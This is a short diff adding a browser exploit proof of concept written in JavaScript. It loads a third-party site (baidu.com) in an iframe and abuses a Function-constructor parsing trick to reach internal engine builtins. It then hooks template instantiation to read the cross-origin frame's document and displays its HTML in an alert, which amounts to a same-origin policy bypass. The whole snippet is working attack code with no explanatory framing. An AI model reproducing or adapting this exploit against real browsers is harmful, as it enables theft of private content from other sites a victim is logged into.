@@ -1,0 +1,28 @@
+ <script>
+ 
+frame = document.body.appendChild(document.createElement("iframe"));
+frame.src = "http://www.baidu.com/";
+ 
+frame.onload = function() {
+    Function("}, (builtins = this), function() {");
+    originalInstantiate = builtins.Instantiate;
+    builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {});
+    flag = 0;
+    template = null;
+    builtins.Instantiate = function(x, y) {
+        if (flag) {
+            doc = frame.contentWindow.document;
+            alert(doc.body.innerHTML);
+            flag = 0;
+        } else if (!template)
+            template = x;
+ 
+        return originalInstantiate(x, y);
+ 
+    };
+    document.implementation;
+    flag = 1;
+    builtins.ConfigureTemplateInstance(frame.contentWindow, template);
+}
+</script>
+</body>
